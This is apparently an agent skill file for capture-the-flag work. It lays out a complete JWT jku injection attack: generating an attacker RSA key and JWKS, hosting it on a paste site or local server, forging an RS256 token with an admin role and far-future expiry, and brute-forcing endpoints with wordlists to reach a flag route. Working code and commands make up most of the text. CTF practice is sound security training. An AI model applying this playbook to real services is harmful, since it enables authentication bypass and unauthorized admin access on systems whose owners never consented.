---
name: jwt-jku-injection
description: Exploit JWT jku (JWK Set URL) injection — forge an RS256 token signed by an attacker-held key, host a JWKS at an attacker-controlled URL, point the token's jku at it, and reach a protected admin endpoint. Use when a JWT's header contains a "jku" field pointing to a key URL, or when a challenge mentions "tokens carry their own key pointer", "key rotation", or custom JWT verification.
---

# JWT `jku` (JWK Set URL) Injection

## When to use
- Decoded JWT header has `"jku": "<url>"` (JWK Set URL).
- Challenge mentions: "token tells the server where to find its own verification key", "key rotation", "bring your own keys", custom JWT middleware, `kid` + `jku`.
- RS256/ES256 (asymmetric) signing — you only need the PUBLIC key in the JWKS you host.

## The vuln in one line
Server fetches whatever `jku` the token declares to get the verifying key, with NO host allowlist. You bring your own key.

## Steps

### 1. Recon + capture a legit token
```
curl -s -X POST "$BASE/api/signup" -H "Content-Type: application/json" -d '{"username":"u","password":"p"}'
TOK=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" -d '{"username":"u","password":"p"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
```

### 2. Decode header/payload (confirm jku + alg)
```
python3 - <<'PY'
import base64,json
def d(s):
    s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
for p in TOK.split(".")[:2]: print(d(p).decode())
PY
```
Look for `{"alg":"RS256","jku":"...","kid":"..."}`.

### 3. Generate attacker RSA keypair + JWKS
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64,json
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pub=priv.public_key()
open("priv.pem","wb").write(priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption()))
n,e=pub.public_numbers().n,pub.public_numbers().e
def b(x):
    b=x.to_bytes((x.bit_length()+7)//8,"big"); return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
jwks={"keys":[{"kty":"RSA","use":"sig","kid":"attacker-key-1","n":b(n),"e":b(e)}]}
open("jwks.json","w").write(json.dumps(jwks,indent=2))
```

### 4. Host the JWKS at a URL the SERVER can egress to
- Try raw paste hosts: paste.rs, or any host returning the JSON with `Content-Type: application/json`, no HTML wrapper, no redirect.
- Local server works if target has egress: `python3 -m http.server 8000 --bind ::` (serve jwks.json in cwd) → `http://[YOUR_IPV6]:8000/jwks.json`.
- Verify from YOUR box: `curl -sL "$JKU" | diff - <(python3 -m json.tool jwks.json)`.

### 5. Forge the admin token (pyjwt in a venv: `python3 -m venv v; . v/bin/activate; pip install pyjwt cryptography`)
```python
import jwt
from cryptography.hazmat.primitives import serialization
priv=serialization.load_pem_private_key(open("priv.pem","rb").read(),password=None)
JKU="https://YOUR_HOST/jwks.json"   # the hosted JWKS
hdr={"alg":"RS256","typ":"JWT","jku":JKU,"kid":"attacker-key-1"}
payload={"exp":9999999999,"role":"admin","sub":"u"}
open("forged.txt","w").write(jwt.encode(payload,priv,algorithm="RS256",headers=hdr))
```

### 6. Find the protected endpoint
`/api/login` often does NOT validate a Bearer token (returns 401 for forged/bogus/no-auth alike = bad creds). The flag route is usually elsewhere.
Fuzz with the forged token across prefixes:
```bash
TOK=$(cat forged.txt)
for ep in admin/flag api/admin api/flag internal/admin flag dashboard vpns; do
  echo "GET /$ep ->" $(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOK" "$BASE/$ep")
done
```
A `200` with the flag (or a non-404 on a route that consumes the token) = win.

**When the obvious guesses 404, brute-force with seclists wordlists.** Hand guesses miss hidden routes like `/admin/flag`. Use:
- `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt` (API-style paths)
- `/usr/share/seclists/Discovery/Web-Content/raft-top-directories-lowercase-20000.txt` (top dirs)
Run both GET and POST for each candidate, with the forged token in `Authorization: Bearer`. This is how `/admin/flag` was actually found (after manual guesses all 404'd). Watch for the protected route returning 401 on a forged token but 200 once `jku` is reachable — that's the validating endpoint.

### 7. Winning request
```
curl -H "Authorization: Bearer $(cat forged.txt)" "$BASE/admin/flag"
```

## Pitfalls
- 401 on the auth endpoint is NOT token rejection — it's "bad login". Check forged vs bogus vs no-auth all return 401 there → it ignores Bearer.
- Server must reach your `jku` host. If 401 on a real protected route, the server couldn't fetch your JWKS (egress blocked / wrong URL).
- Some servers follow redirects or fetch with a specific UA — verify your host returns clean JSON.
- If `jku` is ignored but `kid` is used to look up a local key, this won't work — pivot to `kid` path traversal / SQLi / key confusion.
- Don't host the JWKS on a site that wraps it in HTML (tmpfiles, pastebin.com non-raw). Use raw endpoints only.

## Detection of success
Non-404 + admin content, or `200 {"flag":...}` from a protected route using the forged token = confirmed jku injection.
